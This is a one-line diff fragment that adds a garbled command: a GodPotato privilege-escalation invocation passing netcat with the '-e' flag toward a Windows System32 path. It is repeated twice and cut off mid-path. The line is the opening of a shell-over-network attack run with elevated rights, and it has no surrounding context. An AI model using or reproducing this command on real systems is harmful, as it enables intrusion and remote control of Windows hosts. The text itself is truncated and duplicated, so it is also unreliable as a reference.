@@ -1,0 +1,1 @@
+GodPotato -cmd "nc -t -e C:\Windows\System32GodPotato -cmd "nc -t -e C:\Windows\System32
